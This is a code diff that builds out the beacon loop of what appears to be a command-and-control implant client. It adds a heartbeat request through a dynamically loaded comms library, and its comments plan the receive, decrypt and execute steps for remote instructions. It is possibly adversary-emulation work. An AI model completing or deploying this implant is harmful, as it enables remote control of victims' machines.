@@ -1,5 +1,9 @@
 #include "ClientPP.hpp"
 
+namespace client {
+    const int RESP_BUFFER_SIZE = 4096;
+}
+
 bool ClientPP::osInfo (int dwRandomTimeSleep) {
     // if parameters are populated, just return true
 
@@ -15,13 +19,25 @@ bool ClientPP::osInfo (int dwRandomTimeSleep) {
     return true;
 }
 
-void ClientPP::runClient(int dwRandomTimeSleep) {
+void ClientPP::runClient(int dwRandomTimeSleep, void * dylib) {
     // heartbeat - send HTTP GET request to server
+    std::string heartbeat = "I will eventually contain the heartbeat";
+    std::vector<unsigned char> heartbeat_vector( heartbeat.begin(), heartbeat.end() );
+    std::vector<unsigned char> response_vector = ClientPP::performHTTPRequest(dylib, "GET", heartbeat_vector);
+
+    std::cout << "Response buffer contains: ";
+    for (auto i: response_vector) {
+        std::cout << i;
+    }
+    std::cout << std::endl;
+
     // receive and decrypt instructions
     // execute instructions
     // encrypt instructions
     // return output - send HTTP POST request to server
-    return;
+
+    // sleep after execution
+    std::this_thread::sleep_for(std::chrono::milliseconds(dwRandomTimeSleep));
 }
 
 int8_t ClientPP::createClientID() {
@@ -35,7 +51,23 @@ int8_t ClientPP::createClientID() {
     return *id;
 }
 
-void ClientPP::performHTTPRequest(std::string type, std::vector<unsigned char> data) {
-    // should call the CommsLib exported function that generates the HTTP request
-    // should return the data type returned by the CommsLib exported function
+std::vector<unsigned char> ClientPP::performHTTPRequest(void* dylib, std::string type, std::vector<unsigned char> data) {
+    // set response_buffer and response_length to hold the HTTP response and size
+    unsigned char response_buffer[client::RESP_BUFFER_SIZE] = { 0 };
+    unsigned char* response_buffer_ptr = &response_buffer[0];
+    int response_length = 0;
+    int* response_length_ptr = &response_length;
+    
+    // loads CommsLib exported function that generates the HTTP request
+    void (*sendRequest)(const char * str, const std::vector<unsigned char> data, unsigned char ** response, int ** response_length) = (void(*)(const char*, const std::vector<unsigned char>, unsigned char**, int**))dlsym(dylib, "sendRequest");
+    if (sendRequest == NULL) {
+        std::cout << "unable to load libComms.dylib sendRequest" << std::endl;
+        dlclose(dylib);
+        return std::vector<unsigned char>();
+    }
+
+    // call CommsLib sendRequest and pass the pointers to the response_buffer and response_length for updating
+    sendRequest(type.c_str(), data, &response_buffer_ptr, &response_length_ptr);
+
+    return std::vector<unsigned char>(response_buffer, response_buffer + response_length);
 }
